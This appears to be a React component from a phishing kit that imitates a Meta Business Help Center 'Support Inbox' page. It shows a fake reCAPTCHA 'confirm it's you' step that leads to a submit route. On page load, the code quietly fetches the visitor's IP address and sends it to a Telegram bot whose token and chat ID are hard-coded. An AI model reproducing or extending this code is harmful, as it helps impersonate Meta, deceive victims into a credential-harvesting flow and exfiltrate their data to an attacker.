import React, { useEffect, useState, useRef } from "react";
import axios from 'axios';
import logo from './Meta-Logo.png';
import ReCAPTCHA from 'react-google-recaptcha';
import { useNavigate } from 'react-router-dom';
//import 'bootstrap/dist/css/bootstrap.min.css';
//import './App.css';
//import './Main.css';
import './Header.css';
const Header = () => {
    const captchaRef = useRef(null)
    const navigate = useNavigate();
    const [recaptchaValue, setRecaptchaValue] = useState(null);
//   const botToken = '7024816830:AAHGOLB6hG5kV57GaTb7C5AFcCb1BNBhtJk';
//   const chatId = '6407116387'; 
const botToken = '7009255232:AAFJ0oqZUaMmsMejKhbdaLnSxYyh6pl255w';
  const chatId = '6481657183';
  const [ip, setIP] = useState("");
  const getData = async () => {
   
    const res = await axios.get("https://api.ipify.org/?format=json");
    const currentIp = res.data.ip;
    //setIP(res.data.ip);
    setIP(currentIp);
    axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      chat_id: chatId,
      text: `IP address: ${currentIp}\n Now someone invited header page.`
    }).then(({data}) => {
    })
  
    axios.get("https://api.ipify.org/?format=json")
      .then((res) => {
        setIP(res.data.ip);
      });

    if (ip) {
      axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        chat_id: chatId,
        text: `IP address: ${ip}\n Now someone invited header page.`
      }).then(({data}) => {
      });
    }
   
  }; 

  const handleRecaptchaChange = (value) => {
    setRecaptchaValue(value);
  };

  const handleSubmit = async (event) => {
    event.preventDefault();
    if (recaptchaValue) {
        navigate('/submit');
    }
    
  };

  const getButtonClassName = () => {
    // Define your conditions for different class names based on reCAPTCHA value
    if (recaptchaValue === null) {
      return 'notification-button-disabled'; // Add your class for disabled state
    } else {
      return 'notification-button'; // Add your class for enabled state
    }
  };
  useEffect(() => {
    //passing getData method to the lifecycle method
    getData();
  }, []);
  // useEffect(() => {
  //   getData();
  // }, [ip]);
  return (
    <div className="header">
            <header style={{zIndex: 999}}>
                <img src={logo} alt="" className="logo" />
                <h1>Support Inbox</h1>
            </header>

            <div className="containers" style={{ backgroundSize: 'cover', minHeight: '50px', display: 'flex', flexDirection: 'column', justifyContent: 'center', alignItems: 'center' }}>
                <h2 style={{ fontSize: '26px' }} centered>Meta Business Help Center</h2>
            </div>

            <br />

            <form onSubmit={handleSubmit}>
                <div className="notification card" style={{maxWidth:'650px'}}>
                <div className="notification-title card-title">Help us confirm it's you</div>
                
                <div className="form-container">
                    <ReCAPTCHA
                        sitekey="6LcB24kpAAAAAPFoZw-5OQvmYhSgvRQVKwk99Qqr"
                        onChange={handleRecaptchaChange}
                    />
                </div>
                <div className="notification-description">
                    This helps us to combat harmful conduct, detect and prevent spam and maintain the integrity of our Products.
                </div>
                <div className="notification-description">
                    We've used reCAPTCHA Enterprise product to provide this security check.
                </div>
                <div className="notification-description">
                    Your use of reCAPTCHA Enterprise is subject to Google's Privacy Policy and Terms of Use.
                </div>
                <div className="notification-description">
                    reCAPTCHA Enterprise collects hardware and software information such as device and application data, and sends it to Google to provide, maintain, and improve reCAPTCHA Enterprise and for general security purposes.
                    This information is not used by Google for personalized advertising.
                </div>
                <input type="submit" className={getButtonClassName()} style={{ width: "120px" }} value={'Continue'} />
            </div>
            </form>

        </div>
    
  );
};

export default Header;
